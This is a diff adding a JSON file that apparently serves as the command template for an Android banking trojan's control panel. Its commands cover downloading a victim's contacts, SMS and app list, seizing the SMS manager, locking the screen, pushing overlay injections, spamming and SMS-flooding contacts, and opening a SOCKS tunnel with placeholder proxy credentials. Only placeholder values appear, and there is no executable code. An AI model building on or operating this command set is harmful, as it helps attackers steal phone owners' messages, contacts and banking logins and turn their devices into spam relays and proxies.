@@ -1,0 +1,52 @@
+{
+
+  "Download_Contacts": {
+  },
+  "Change_SMS_Manager": {
+  },
+  "Screen_Lock": {
+  },
+  "Unlock_Screen": {
+  },
+  "ReInjection": {
+  },
+  "Download_All_SMS": {
+  },
+  "Download_All_App": {
+  },
+  "Spam_on_contacts": {
+    "text": "Text spam"
+  },
+  "Update_Inject": {
+    "Link": "Inject"
+  },
+  "Run_App": {
+    "App": "Name APP"
+  },
+  "Run_Notification": {
+  },
+  "Run_Necessary_Injection": {
+    "Name_App": "Name_App"
+  },
+  "Send_SMS": {
+    "number": "telephone number for send sms message",
+    "text": "just a message"
+  },
+  "Flood_SMS": {
+    "Number": "telephone number for send sms message",
+    "Text": "just a message"
+  },
+  "Run_Message_and_Injection": {
+    "icon": "Icon Message",
+    "Title": "Title Message",
+    "Text": "Text Message",
+    "Injection": "Name Injection"
+  },
+  "StartSocks": {
+    "id": "id of proxy server",
+    "ip": "ip address",
+    "user": "put fwd username here",
+    "pass": "put fwd password here",
+    "port": "port on server for make a tunnel"
+  }
+}
